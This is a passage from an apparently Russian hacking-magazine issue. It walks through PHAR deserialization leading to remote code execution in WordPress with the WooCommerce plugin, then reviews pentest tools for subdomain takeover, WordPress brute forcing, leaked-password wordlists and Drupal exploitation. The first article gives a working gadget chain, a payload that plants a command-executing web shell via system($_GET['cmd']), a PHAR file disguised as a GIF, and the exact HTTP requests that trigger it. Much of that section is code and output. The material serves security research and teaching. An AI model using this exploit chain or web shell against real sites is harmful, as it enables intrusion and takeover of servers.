зуемых при помощи файлов архивов PHP — PHAR. Эта тех‐
ника атаки может использовать безобидные, казалось бы,
функции как опасные орудия эксплуатации. И превратить,
например, SSRF в выполнение произвольного кода.


Пристальное внимание эта ата ка привлекла совсем недавно, поэтому сущес‐
твует огромное количество потенциально уязвимых приложе ний. Что каса‐
ется уязвимости в WordPress, то о ней раз работчикам сообщили аж в фев‐
рале 2017 года, но до сих пор никакого фикса они не выпустили.


ПРЕДЫСТОРИЯ АТАКИ
О возможности такой атаки начали много говорить после доклада Сэма
Томаса (Sam Thomas) из Secarma на недавно прошедшем Black Hat USA 2018.
Историю подхватили СМИ, и понес лось.
   Хотя первые звоночки можно было заметить еще в багтре кере PHP
в 2015 году. Тогда был создан тикет, в котором опи сывалась проблема чте‐
ния памяти за пределами выделенного буфера (buﬀer over‐read) при десери‐
ализации метаданных архива PHAR.
  Помимо этого, в 2017 году на HITCON CTF Quals в таске известного
безопасника Orange Tsai под названием Baby^H Master PHP 2017 одним
из пунктов правильного решения зна чилась экс плуатация этой особенности
поведения PHP при работе с архивами PHAR. Подробнее об этом ты можешь
прочитать в посте Омара beched Ганиева на форуме RDot. Там же ты най‐
дешь все сопутствующие ссылки. Довольно интересно, рекомендую.
   Итак, сама идея не нова, а лишь недавно была раскручена и использована
для проведения атак на реально существу ющие приложения. Пришло время
пощупать все своими руками!


СТЕНД
Нет ничего проще, чем стенд с PHP. Что бы не заморачиваться, можно взять
из репозитория Docker любой контейнер приложения, написанного на этом
языке. Мы планируем атаковать WordPress, так что его и возьмем.


$ docker run ‐it ‐‐rm ‐p80:80 ‐‐name=wprce ‐‐hostname=wprce debian /
bin/bash

После запуска контейнера уста навливаем нуж ные утилиты.


$ apt‐get update && apt‐get install ‐y mysql‐server apache2 php php7.
0‐mysqli php7.0‐xml nano wget

Затем скачиваем нужную версию WordPress. Фикса на данный момент до сих
пор нет, так что можно ска чивать любую.


$ cd /tmp && wget https://wordpress.org/wordpress‐4.9.8.tar.gz
$ tar xzf wordpress‐4.9.8.tar.gz
$ rm ‐rf /var/www/html/* && mv wordpress/* /var/www/html/
$ chown ‐R www‐data:www‐data /var/www/html/

Запускаем необходимые сервисы и соз даем юзера и базу данных.


$ service mysql start && service apache2 start
$ mysql ‐u root ‐e "CREATE DATABASE wprce; GRANT ALL PRIVILEGES ON *.
* TO 'root'@'localhost' IDENTIFIED BY 'megapass';"





                    Ус тановка WordPress на стенде

Осталось только установить расширение Woocommerce, создать пользовате‐
ля с правами автора, и стенд готов к экспериментам.


НЕМНОГО О PHAR
PHAR — это PHP Archive, специально сформированный архив, который может
быть обработан и исполнен интерпретатором PHP. За это отве чает одно‐
именный модуль PHAR, который вхо дит в стандартную пос тавку PHP начиная
с версии 5.3. Архивы PHAR были введены как удоб ный способ группировки
и доставки файлов PHP. Можно упа ковать целое приложение и все еще иметь
возможность запустить его пря мо из этого файла. При этом его не нужно
даже распаковывать на диск. Так, например, пос тавляется менеджер модулей
PEAR или всем известный composer.





            Composer пос тавляется как еди ный файл PHAR

Для создания файлов PHAR мож но использовать сам интерпретатор PHP.


create-phar.php
1: <?php
2: @unlink("test.phar");
3: $phar = new Phar("test.phar");
4: $phar["helloworld.php"] = '<?php echo("Hello World!");';

Чтобы иметь возможность соз давать архивы, нуж но запустить репозиторий
с отключенной настрой кой phar.readonly.


$ php ‐dphar.readonly=0 create‐phar.php





                 Создание тестового фай ла PHAR

По дефолту сжатие не используется.
   Если мы попытаемся выполнить полученный файл, то интерпретатор вер‐
нет ошибку.





     Попытка выполнить созданный тес товый файл PHAR номер раз

При простом обращении к файлу модуль пытается прочитать index.php. Так
как этого файла в нашем архиве нет, воз никает ошибка. Если мы немного
дополним тестовый скрипт, то получим архив, который будет отрабаты вать
при прямом обращении к нему.


create-phar.php
1: <?php
2: @unlink("test.phar");
3: $phar = new Phar("test.phar");
4: $phar["helloworld.php"] = '<?php echo("Hello World!");';
5: $phar["index.php"] = '<?php echo("Hello from index!");';





     Попытка выполнить созданный тес товый файл PHAR номер два

Лю бые архивы PHAR одинаково легко вызываются как непосредственно
из командной стро ки, так и через веб‐сервер. Модуль реализует эту функцию
с помощью потоков. Чтобы вызывать какие‐то конкретные скрипты из контей‐
нера, существует враппер phar://.


exec-internal.php
1: <?php
2: include('phar://test.phar/helloworld.php');

Результатом выполнения будет строка Hello World!.
   Что касается формата файла, то его описание можно найти в официаль‐
ной документации, в том числе и на русском. Любой уважающий себя файл
PHAR включает в себя заглушку, манифест, содержимое и подпись.
  Пара слов о заглушке  (stub). Она, как правило, содержит загрузчик,
который выполняется при прямом запуске архива или когда его подключают
через include без указания конкретного файла внутри.
  По дефолту там находится обычный код на PHP, который после нескольких
манипуляций инклудит index.php. Но никто не меша ет нам указать собствен‐
ный лоадер. Это можно сделать, используя метод Phar::setStub(). В качестве
его параметра указываем код.
  Последней структурой в заг лушке всегда должна идти __HALT_COMPILER()
;. То есть минимально воз можный код выглядит так:


<?php __HALT_COMPILER();

Запомним, так как это пригодится нам чуть даль ше.
   Теперь нас интересует манифест, который содержит ключевую информа‐
цию о том, что включено в архив PHAR. Его структура выглядит следующим
образом.





                   Структура манифеста PHAR‐архива

Обрати внимание на раздел метаданных, они хра нятся в формате serialize
и могут быть как глобальными, так и при вязанными к конкретному файлу.
Установить глобальные метаданные можно при помощи метода Phar::set‐
Metadata. В качестве аргу мента можно передать любую переменную PHP.


test-metadata.php
1: <?php
2: @unlink('test.phar');
3: $p = new Phar(dirname(__FILE__) . '/test.phar', 0);
4: $p['file.php'] = '<?php echo("Hello World!");';
5: $p‐>setMetadata(['anything' => 'you_want']);
6: var_dump($p‐>getMetadata());

Разумеется, можно передавать и экземпляры классов, благо формат предус‐
матривает их сох ранение. Давай попробуем сохранить в качестве метадан‐
ных класс, который содержит деструктор.


01: <?php
02: @unlink('test.phar');
03: class Destructor {
04:     function __destruct() {
05:         echo "It's alive!";
06:     }
07: }
08: $p = new Phar(dirname(__FILE__) . '/test.phar', 0);
09: $p['file.php'] = '<?php echo("Hello World!");';
10: $p‐>setMetadata(new Destructor());

Воспользуемся кастомной заглушкой, чтобы иметь возможность выполнить
файл PHAR без ошибок.


test-metadata-class-stub.php
01: <?php
02: @unlink('test.phar');
03: class Destructor {
04:     function __destruct() {
05:         echo "It's alive!";
06:     }
07: }
08: $p = new Phar(dirname(__FILE__) . '/test.phar', 0);
09: $p['file.php'] = '<?php echo("Hello World!");';
10: $p‐>setMetadata(new Destructor());
11: $p‐>setStub('<?php __HALT_COMPILER();');





        Создание архива PHAR с объектом в качес тве метаданных

Заглушка может содержать любой текст, в том чис ле и не код на PHP. Глав‐
ное, чтобы в нем присутствовала ука занная выше конструкция. А благодаря
тому, что stub располага ется в начале файла, можно обходить вся ческие про‐
верки и «превращать» архивы PHAR в файлы любого типа.


test-metadata-class-gif-stub.php
01: <?php
02: @unlink('test.phar');
03: class Destructor {
04:     function __destruct() {
05:         echo "It's alive!";
06:     }
07: }
08: $p = new Phar(dirname(__FILE__) . '/test.phar', 0);
09: $p‐>setMetadata(new Destructor());
10: $p‐>setStub('GIF89a<?php __HALT_COMPILER();');





      Создание архива PHAR с заголовком GIF в качес тве заглушки

Теперь, если просто попробовать вызвать полученный архив (например,
через file_get_contents), код внутри дес труктора отработает. Конечно же,
на момент вызова класс должен быть проинициализирован.


call-phar.php
1: <?php
2: class Destructor {
3:     function __destruct() {
4:         echo "It's alive!";
5:     }
6: }
7: file_get_contents("phar://test.phar");





        Выполнение кода деструктора при чтении архива PHAR

То есть при наличии метаданных выполняется их десериализация, что под‐
тверждают сорцы PHP.


/php-src/master/ext/phar/phar.c
607: int phar_parse_metadata(char **buffer, zval *metadata, uint32_t
zip_metadata_len) /* {{{ */
608: {
609:    php_unserialize_data_t var_hash;
610:
611:    if (zip_metadata_len) {
...
616:        PHP_VAR_UNSERIALIZE_INIT(var_hash);
617:
618:        if (!php_var_unserialize(metadata, &p, p + zip_me
tadata_len, &var_hash)) {

Благодаря такому поведению мы имеем воз можность проводить атаки типа
«внедрение объектов PHP» (PHP Object Injection). Причем такое же поведе ние
наблюдается при работе совсем безобидных на первый взгляд функций, вро‐
де is_file.





  Выполнение кода из дес труктора при доступе к архиву PHAR при помощи
   is_ﬁle

В общем, подойдет большинс тво функций для работы с файловой системой
и некоторые другие, работающие с потоками. Вот список наиболее интерес‐
ных:
 • ﬁle
 • ﬁle_exists
 • ﬁle_get_contents
 • ﬁlesize
 • fopen
 • getimagesize
 • is_dir
 • is_ﬁle
 • is_readable
 • is_writable
 • stat

К сожалению, враппер PHAR не позволяет подгружать файлы с удаленных
машин, но зато это отлично работа ет даже в тех конфигурациях, где парамет‐
ры allow_url_fopen и allow_url_include отключены.
   Теперь, когда мы знаем потенциальный вектор атаки, можно переходить
от синтетических примеров к реальным.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     ОПАСНЫЙ PHAR
                     ЭКСПЛУАТИРУЕМ ПРОБЛЕМЫ
              ДЕСЕРИАЛИЗАЦИИ В PHP НА ПРИМЕРЕ
                    УЯЗВИМОСТИ В WORDPRESS





RCE В WORDPRESS ЧЕРЕЗ WOOCOMMERCE
Эксплуатация уязвимостей типа PHP Object Injection уже неоднократно раз‐
биралась, в том числе и в моей статье об уяз вимос ти в Processmaker. Вкрат‐
це: нам нужно найти цепочку гаджетов, то есть клас сов, в магичес ких методах
(__destruct, __wakeup, __toString и подоб ных), в которых происходит
что‐нибудь инте ресное. Например, при десериализации класса ниже мы
сможем записать данные в любой файл.


class DumbWakeUp {
...
    function __wakeup() {
        file_put_contents($this‐>file, $this‐>data);
    }
}

Но это все абстракции, в реальных приложениях порой сложно найти
что‐нибудь более‐менее полезное с точки зрения возможной экс плуатации.
  В вышедших до ноября 2017‐го версиях WordPress существовала цепочка,
которая начиналась с одного метода __toString в клас се WP_Theme и закан‐
чивалась вызовом create_function из Translations::make_plural_for‐
m_function с контролиру емыми парамет рами. Но в текущих версиях такой
роскоши в ядре пока не наш лось. Авто лоадер клас сов WordPress тоже
не использует, поэто му существует воз можность использовать только те
классы, которые были заг ружены на момент десериализации. Ввиду сложив‐
шихся обстоятельств нам придется обратиться к пла гинам.
  Woocommerce — популярнейшее рас ширение для создания магазина
на основе WordPress. В нем и обнаружилась воз можность эксплуатации этой
уязвимости, которая приводит к выполнению произвольного кода.
   Взглянем на метод current класса Requests_Utility_FilteredItera‐
tor из ядра WordPress.


/wordpress-4.9.8/wp-includes/Requests/Utility/FilteredIterator.php
15: class Requests_Utility_FilteredIterator extends ArrayIterator {
16:     /**
17:      * Callback to run as a filter
18:      *
19:      * @var callable
20:      */
21:     protected $callback;
...
40:     public function current() {
41:         $value = parent::current();
42:         $value = call_user_func($this‐>callback, $value);
43:         return $value;
44:     }

Он выполняется при дос тупе к текущему элементу массива, например при их
переборе через foreach.


test-arrayiterator.php
01: <?php
02: class Requests_Utility_FilteredIterator extends ArrayIterator {
03:     public function __construct($data) {
04:         parent::__construct($data);
05:     }
06:     public function current() {
07:         $value = parent::current();
08:         var_dump($value);
09:         return $value;
10:     }
11: }
12: $o = new Requests_Utility_FilteredIterator(['random', 'array', '
elements']);
13: foreach ($o as $value) {
14: }





  Вызов метода current при перебо ре через foreach экземпляра класса
   ArrayIterator

Если теперь найти такой класс, который в одном из «вол шебных» методов
выпол няет перебор контролируемой юзером переменной через foreach, то
можно выполнить произвольный код. И такой класс, как ты понимаешь,
нашелся в Woocommerce.


/woocommerce-3.4.4/includes/log-handlers/class-wc-log-handler-
file.php
19: class WC_Log_Handler_File extends WC_Log_Handler {
...
26:     protected $handles = array();
...
65:     public function __destruct() {
66:         foreach ( $this‐>handles as $handle ) {
67:             if ( is_resource( $handle ) ) {
68:                 fclose( $handle ); // @codingStandardsIgnoreLine.
69:             }
70:         }
71:     }

Быстренько накидаем скрипт, который сгенери рует требуемую цепочку гад‐
жетов для выполнения RCE.


woocommerce-rce-gadget.php
01: <?php
02: class Requests_Utility_FilteredIterator extends ArrayIterator {
03:     protected $callback;
04:     public function __construct($data, $callback) {
05:         parent::__construct($data);
06:         $this‐>callback = $callback;
07:     }
08: }
09: class WC_Log_Handler_File {
10:     protected $handles;
11:     public function __construct() {
12:         $this‐>handles = new Requests_Utility_FilteredIterator(
array('uname ‐a'), 'system');
13:     }
14: }
15: $o = new WC_Log_Handler_File();
16: var_dump(serialize($o));





  Сгенерированный гад жет для экс плуатации WordPress через
  Woocommerce

В качестве пейлоада я использовал system('uname ‐a'). Теперь его нужно
как‐то доставить на целевую систему. Отлично подойдет менеджер меди‐
афайлов в WP. Кладем наш гаджет в метаданные архива и в качестве стаба
указываем стандартный заголо вок GIF.


wc-rce-gadget-to-phar.php
01: <?php
02: class Requests_Utility_FilteredIterator extends ArrayIterator {
03:     protected $callback;
04:     public function __construct($data, $callback) {
05:         parent::__construct($data);
06:         $this‐>callback = $callback;
07:     }
08: }
09: class WC_Log_Handler_File {
10:     protected $handles;
11:     public function __construct() {
12:         $this‐>handles = new Requests_Utility_FilteredIterator(
array('uname ‐a'), 'system');
13:     }
14: }
15: @unlink('rce.phar');
16: $p = new Phar(dirname(__FILE__) . '/rce.phar', 0);
17: $p‐>setMetadata(new WC_Log_Handler_File());
18: $p‐>setStub('GIF89a<?php __HALT_COMPILER();');
19: $p['any'] = '';





         Создаем PHAR с полез ной нагрузкой и заголовком GIF

Добавляем как минимум один файл в архив (строчка 19). Некоторые функции
чувствительны к этому, и у меня никак не хотел отра баты вать сплоит, пока я
не добавил в мой PHAR пус той файл. Меня ем рас ширение фай ла с .phar
на .gif и загружаем файлы в WordPress. Это можно сде лать как через панель
управления, так и через XML‐RPC. По дефолту загрузка дос тупна только поль‐
зователям с правами авто ра и выше.





              Загрузка PHAR в WordPress под видом гифки

Запоминаем ID и путь до загруженного файла. Даль ше нужно каким‐то обра‐
зом вызвать файл через враппер phar. Посмотрим на функцию wp_get_at‐
tachment_thumb_file.


/wordpress-4.9.8/wp-includes/post.php
5334: function wp_get_attachment_thumb_file( $post_id = 0 ) {
5335:   $post_id = (int) $post_id;
5336:   if ( !$post = get_post( $post_id ) )
5337:       return false;
5338:   if ( !is_array( $imagedata = wp_get_attachment_metadata( $
post‐>ID ) ) )
5339:       return false;
5340:
5341:   $file = get_attached_file( $post‐>ID );
5342:
5343:   if ( !empty($imagedata['thumb']) && ($thumbfile = str_replace
(basename($file), $imagedata['thumb'], $file)) && file_exists($thumbf
ile) ) {

Она доступна через интерфейс XML‐RPC при вызове метода wp.getMedi‐
aItem.


POST /xmlrpc.php HTTP/1.1
Host: wprce.vh
Content‐Type: text/xml
Connection: close


<?xml version="1.0" encoding="utf‐8"?>
<methodCall>
  <methodName>wp.getMediaItem</methodName>
  <params>
    <param>
      <value>
        <int>1</int>
      </value>
    </param>
    <param>
      <value>
        <string>author</string>
      </value>
    </param>
    <param>
      <value>
        <string>author</string>
      </value>
    </param>
    <param>
      <value>
        <int>10</int>
      </value>
    </param>
  </params>
</methodCall>





  Запрос информации о загруженном фай ле через интерфейс XML‐RPC
  с помощью метода wp.getMediaItem

Здесь переменная $thumbfile попада ет в file_exists, которая понимает
потоки. Помимо  этого,  $thumbfile  зависит  от  $imagedata['thumb']
и $file. Если результат работы basename($file) будет равен самой
переменной  $file,  тогда  $thumbfile  примет  значение  $imagedata[
'thumb'], а ее мы можем пол ностью контролировать при помощи запроса.
  Посмотрим, откуда растут ноги переменной $file.


/wordpress-4.9.8/wp-includes/post.php
331: function get_attached_file( $attachment_id, $unfiltered = false
) {
332:    $file = get_post_meta( $attachment_id, '_wp_attached_file',
true );
333:
334:    // If the file is relative, prepend upload dir
335:    if ( $file && 0 !== strpos( $file, '/' ) && ! preg_match( '|^
.:\\\|', $file ) && ( ( $uploads = wp_get_upload_dir() ) && false ===
 $uploads['error'] ) ) {
336:        $file = $uploads['basedir'] . "/$file";
337:    }

Она берется из метаданных загруженного файла, из поля _wp_attached_‐
file, которое мы также можем изменять при помощи запроса на редак‐
тирование аттача. Для это го нужен валидный CSRF‐токен _wpnonce, который
можно взять из менеджера файлов WordPress. Интересующий нас параметр
называется file.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: cookies
_wpnonce=ffffffff&post_type=attachment&post_ID=10&file=ANYTHING





  Запрос на редактирование поля _wp_attached_ﬁle в метаданных аттача
  WordPress





       Информация об атта че после изменения _wp_attached_ﬁle

Взгляни на проверку ! preg_match( '|^.:\\\|', $file ). Ее можно обой‐
ти, используя абсолютные пути в стиле Windows. Если мы укажем A:\A
в качестве параметра file, то усло вие не будет выполнено и переменная
запишется в базу как есть, без префикса абсолют ного пути до директории
uploads.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: cookies
_wpnonce=ffffffff&post_type=attachment&post_ID=10&file=A:\A

Разумеется, это сработа ет только в Unix‐подобных системах, в Windows
поведение будет кор ректным.





            Различное поведение basename в Linux и Windows

Дальше нам нужно обновить поле thumbnail. Это делается с помощью сле‐
дующего запроса.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: cookie
_wpnonce=ffffffff&action=editattachment&post_type=attachment&
post_ID=10&thumb=TEST

Я добавил отладчик в функцию wp_get_attachment_thumb_file для прос‐
мотра интересующих данных.





  Состояние переменных пос ле изменения метаданных загруженного
  файла

Ура‐ура. Теперь то, что мы передадим в параметре thumb, будет попадать
в функцию file_exists. Мы на финишной пря мой. Передаем путь до нашей
гифки с оберткой PHAR.


POST /wp‐admin/post.php HTTP/1.1
Host: wprce.vh
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: cookie
_wpnonce=ffffffff&action=editattachment&post_type=attachment&
post_ID=10&thumb=phar://./wp‐content/uploads/2018/08/rce.gif





   Выполнение произволь ного кода в WordPress с помощью архива PHAR

Вуаля! Видим результат выполнения uname ‐a. А если слегка изменить код
эксплоита, то можно выполнять код немного про ще.


01: <?php
02: class Requests_Utility_FilteredIterator extends ArrayIterator {
03:     protected $callback;
04:     public function __construct($data, $callback) {
05:         parent::__construct($data);
06:         $this‐>callback = $callback;
07:     }
08: }
09: class WC_Log_Handler_File {
10:     protected $handles;
11:     public function __construct() {
12:         $this‐>handles = new Requests_Utility_FilteredIterator(['
system($_GET["cmd"])'], 'assert');
13:     }
14: }
15: @unlink('rce.phar');
16: $p = new Phar(dirname(__FILE__) . '/rce.phar', 0);
17: $p‐>setMetadata(new WC_Log_Handler_File());
18: $p‐>setStub('GIF89a<?php __HALT_COMPILER();');
19: $p['any'] = '';





                     RCE в WordPress

Вот так можно проэксплу атировать уязвимость.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Здесь я рассмотрел только одну атаку, которая касалась CMS WordPress.
В докладе Сэма Томаса ты можешь найти детали о еще двух уяз вимых при‐
ложениях. Первое из них — CMS с открытым исходным кодом TYPO3. Вто‐
рое — библиотека TCPDF, которая повсемес тно используется для фор‐
мирования PDF‐документов средствами PHP. Рассмотрена экс плуатация
на основе CMS Contao.
  В обоих случаях применяется похожий вектор атаки — загрузка фай ла
через менеджер и последу ющий его вызов через SSRF. В качес тве гаджета
используется цепоч ка, которая была сгенерирова на утилитой PHPGGC. Тул за
написана автором презентации и крайне рекомендуется к использованию.
Можно дописать свои модули с гаджетами.
  Думаю, что популяризация этого вектора в ближайшее время аукнется нам
интересными уязвимостями во многих приложениях на PHP. Что ж, будем
ждать!
ВЗЛОМ

7  НОВЫХ УТИЛИТ
ДЛЯ ПЕНТЕСТЕРА
      ПЕРЕБИРАЕМ ПОДДОМЕНЫ,
   ПЕНТЕСТИМ WORDPRESS И DRUPAL,
     ФАЗЗИМ API И КОЕ‐ЧТО ЕЩЕ





                                        Илья Русанен
                                            Главный редактор ][,
                                        занимаюсь разработкой и
                                               безопасностью
                                                   rusanen@glc.ru





В этом выпуске новая подборка софта для пентеста и анализа безопасности.
Научимся с комфортом находить поддомены, потрясем баги WordPress, Dru‐
pal и Magento, поищем уязвимые эндпойнты в API, а на закуску пошаримся
в чужих сливах. Вперед!



ОХОТИМСЯ НА СКРЫТЫЕ ПОДДОМЕНЫ

 • Автор: Michael Henriksen
 • Ссыл ка: Github

Не надо рассказывать, зачем может понадобить ся  искать поддомены.
Во время рекона могут обнаружиться dev‐серверы, забытые инстансы, сер‐
висы для внутреннего использования и многое дру гое. Важно, что, кроме тех‐
нических способов поис ка, есть и «архивные»: поддомены с легкостью могут
засветиться в каких‐нибудь базах, да и просто иметь благозвучные име на
в духе billing.target.com и help.target.com. Этим и воспользуемся.
   Aquatone — это удоб ный Ruby‐гем для поиска поддоменов из открытых
источников. Он содержит в себе целых четыре полез ных утилиты:
 • aquatonediscover;
 • aquatonescan;
 • aquatonegather;
 • aquatonetakeover.


Ищем информацию о доменах
Aquatone‐discover проверя ет базы Wayback Machine, Netcraft, HackerTarget
и многих других на наличие записей о поддоменах нашей цели. Кроме откры‐
тых баз, она может обращать ся к базам сервисов вроде Shodan, но нужно
предварительно указать API‐ключ. И вишенка на торте — те самые словарные
домены.





   Ищем поддомены по всем базам и пытаемся резол вить по словарю


Сканиру ем живые сервисы на обнаружен ных под доменах
Второй этап — проверить полученные живые домены на предмет открытых
портов. В этом нам поможет aquatone‐scan: счи тай его простой альтер‐
нативой Nmap. Он проверит собранные поддомены и выведет список обна‐
руженных открытых портов. Через ключи ‐‐ports и ‐‐threads ты сможешь
указать порты для скана (или один из шаблонов) и количество потоков.





  Список открытых портов, обнаруженных aquatone‐scan на исследуемых
  поддоменах


Со бираем отве ты сервера и скрин шоты
На следующем шаге мы можем собрать дефолтные заголовки и содержимое
ответов обнаруженных хостов, а также сделать скриншоты. В этом нам
поможет утилита aquatone‐gather. Обра ти внимание, что она требует наличия
«иксов» и Node.js, поэто му запус кать стоит или на хосте с Linux, или в виртуал‐
ке.
  Результат работы утилиты будет сохранен в четыре директории с говоря‐
щими названиями:
 • headers;
 • html;
 • screenshots;
 • report.


Про веряем воз можность захвата домена
Ну и в конце посмотрим на забытые домены, которые можно перехватить.
Такая ситуация возможна, когда один из поддоменов указывает на хостинг,
на котором когда‐то рас полагался легитимный сервис компании, но затем
был удален, а записи в DNS остались. В этом случае поможет aquatone‐
takeover.





                 От чет о работе aquatone‐takeover



ИССЛЕДУЕМ WORDPRESS НА УЯЗВИМОСТИ

 • Автор: m4ll0k
 • Ссыл ка: Github

Существует мно жество ска неров безопасности для WordPress. Интерес
ресерчеров к этой платформе объясним: по раз ным оценкам, в мире до сих
пор до четверти всех сайтов работают на WordPress. Из блог‐платформы он
давно превратился в полноценный (пусть и костыльный) фрей мворк для соз‐
дания полноценных сайтов. На WordPress делают порталы, магазины и даже
социальные сети. И конечно же, было бы странно, если бы не существовало
множество  сканеров  безопас ности  для  WordPress. Самый  извес тный
из них — wpscan, написанный на Ruby. Одна ко есть и другие.
  WPSeku — это удоб ный скрипт на Python 3, который поз воляет тебе прос‐
канить основные дыры и утечки чувствитель ной информации в «Вордпрес се».
Из особенностей выделю:
 • анализ заголовков;
 • дисклоз реальных путей на сервере;
 • поиск уязвимых версий движка, плагинов и тем;
 • сбор информации о версиях софта и обнаружение карт сайта (sitemap);
 • перечисление пользователей (в том числе и админов, если они не скры‐
   ты).

Из дополнительных опций мож но выделить брут логинов/паролей по словарю
и анализ исходного кода WP‐сайтов.
  Работает и устанавливается прос то:


# Окружение на третьем питоне
➜ virtualenv ‐‐no‐site‐packages ~/venv/wpseku
# Ставим зависимости
(wpseku) ➜ pip install ‐r requirements.txt
# Запускаем полный скан
(wpseku) ➜ python wpseku.py ‐‐url http://target.com:8080/ ‐‐verbose
    ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
[ + ] Target: http://target.com/
[ + ] Server: nginx (Debian)
[ + ] Uncommon header "X‐Nginx‐Cache" found, with contents: HIT
[ i ] Checking Full Path Disclosure...
    [ + ] Full Path Disclosure: /var/www/html/wp‐includes/rss‐functi
ons.php
[ i ] Checking wp‐config backup file...
    [ + ] wp‐config.php available at: http://target.com/wp‐config.php
[ i ] Checking common files...
    [ + ] robots.txt file was found at: http://target.com/robots.txt
    [ + ] sitemap.xml file was found at: http://target.com/sitemap.
xml
    [ + ] sitemap.xml.gz file was found at: http://target.com/
sitemap.xml.gz
    [ + ] readme.html file was found at: http://target.com/readme.
html
    [ i ] Checking directory listing...
    [ i ] Checking wp‐loging protection...
    [ i ] Checking robots paths...
    [ + ] Robots was found at: http://target.com/robots.txt
    ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
    User‐agent: *
    Disallow: /wp‐admin/
    Allow: /wp‐admin/admin‐ajax.php
    Sitemap: http://target.com/sitemap.xml
[ i ] Passive enumeration themes...
    [ + ] Name: woohoo
[ i ] Enumerating users...
| ID | Username | Login |
|:‐‐‐|:‐‐‐‐‐‐‐‐‐|:‐‐‐‐‐‐|
| 0  | admin    | admin |
| 1  | user     | user  |
...

Перебор учетных записей выполняется так же.





                Брутфорс логина и пароля через WPSeku

Если при пентесте тебе часто попадаются сайты на WordPress, попробуй
WPSeku. Возможно, в твоем арсенале най дется место и для него.



ИЩЕМ СКРЫТЫЕ ПАРАМЕТРЫ HTTP-ЗАПРОСОВ

 • Автор: Somdev Sangwan
 • Ссыл ка: Github

Ты, конечно же, часто подставляешь кавычки, скобочки и прочие странности
в уязвимые параметры GET‐ и POST‐запросов. Иногда руками, чтобы пос‐
мотреть, не вывалится ли приложение в ошиб ку, иногда автоматизированно
при поиске инъекций тулзами типа sqlmap. Одна ко, чтобы что‐то подставлять,
нужно знать параметр, куда именно вставлять. Как правило, список принима‐
емых query‐параметров можно подсмотреть, проксируя запросы в том же
Burp. Однако на множестве сайтов существу ют скрытые параметры, которые
не видны. Причин может быть много:
 • ты не добрался до запросов с ними;
 • с текущими правами они не подставляются, но обрабаты ваются;
 • забытый API;
 • отладочные аргументы.

Утилита arjun может найти такие скрытые параметры. Алгоритм работы сле‐
дующий:
 1. Имеем вордлист со списком большого количес тва всех возможных query‐
   параметров.
 2. Последовательно идем по нему.
 3. Проверяем ответы. Если параметр отражается, значит, он потенциально
   уязвим.





      Ищем скрытые параметры GET‐запросов у главной страницы

Обрати внимание, что скрипт требует requests и наличия второй ветки Python.



ИЗУЧАЕМ ПОПУЛЯРНЫЕ ПАРОЛИ ИЗ СЛИВОВ

 • Автор: Ben «berzerk0»
 • Ссыл ка: Github

Несмотря на то что сегодня доступны бес платные и опенсорсные менеджеры
паролей с хорошей репута цией вроде KeePassXC или минималистичного
pass, множество даже продвинутых юзеров продолжают использовать пяток
паролей, держа их в голове. Особен ность памяти такова, что люди за редким
исключением более склонны выбирать прос тые однотипные пароли. И ста‐
тистика убедительно это доказывает.
   Автор Probable Wordlists долгое время собирал различные утечки паролей,
сортировал, вычищал дуб ликаты и артефакты сливов. В результате Бен
получил почти 13 миллиардов паролей. Затем он выб рал из них те, что встре‐
чались минимум пять раз, и в результате мы имеем перед глазами 2 миллиар‐
да самых популярных в мире паролей, отсортированных по час тоте исполь‐
зования.





  Таковы, по словам автора, самые частые пароли пользователей.
  Хорошая осно ва для словарных атак

Действительно  фундаментальная  работа,  и  я  предлагаю  взгля нуть
как минимум на архив Real‐Passwords, даже если не занимаешься восстанов‐
лением паролей: это прос то интерес но.



СОБИРАЕМ И ЭКСПЛУАТИРУЕМ БАГИ DRUPAL

 • Автор: immunIT
 • Ссыл ка: Github

Drupwn — довольно свежая тулза для анализа Drupal‐сайтов. Она позволяет
как собирать, так и эксплуатировать подходящие по версии уязвимости.
В первом режиме — режиме рекона — программа собирает сведения
об атакуемом хосте. Версии софта, юзеры, модули, темы — drupwn поможет
вытянуть все это, используя предоставлен ные куки или basic auth. Вдобавок
можно  указать  задержки между  запросами  и объ емы  вытас киваемой
информации, чтобы не вызывать силь ных подозрений администратора.





            Собираем информацию об атакуемом хос те

Второй режим — exploit — интерактивный. В нем drupwn проанализи рует сайт
и покажет подходящие экспло иты. Их можно тут же проверить на эксплуата‐
бельность и запустить. Для части понадобятся куки, так что не забудь указать
авторизационные заголовки.





    Drupwn позволяет протес тировать и применить под ходящие сплоиты

Программа тре бует Python 3, использует минимум зависимос тей. Также
в комплекте есть подготовленный Docker‐образ, если не хочется возиться
с venv:


$ docker pull immunit/drupwn
$ docker run ‐‐rm ‐it immunit/drupwn enum <target>
...

А если хочется посмотреть вживую, команда раз работчиков не поленилась
записать asciinema для тебя.



ВЫЯВЛЯЕМ УЯЗВИМОСТИ MAGENTO

 • Автор: Steve Robbins
 • Ссыл ка: Github

Magento — мощная CMS для онлайн‐торговли. У нас она не так популярна,
но в остальном мире ее юзают активно: от крупных брендов типа Nike и Burg‐
er King до локальных сторов ювелирки в Индии. Magento мощная, изученная
и имеет огромное количес тво плагинов и сторонних интеграций. А это значит,
что в многочисленных расширениях (да и в самом ядре) иногда всплы вают
довольно неприятные баги.
  Mage Scan — это тулза для сбо ра информации об инстансе Magento. Уме‐
ет работать как с пер вой веткой, так и со вто рой. Ищет плагины, собирает
информацию об установленном софте и вер сии ядра. Также Mage Scan пыта‐
ется при возможности получить количество категорий и продуктов иссле‐
дуемого магазина.





    Mage Scan дисклозит вер сию ядра и список уста новленных модулей

Программа написана на PHP и распростра няется в виде .phar‐файла.



ИЩЕМ УЯЗВИМЫЕ API-ЭНДПОЙНТЫ

 • Автор: Lalith Rallabhandi
 • Ссыл ка: Github

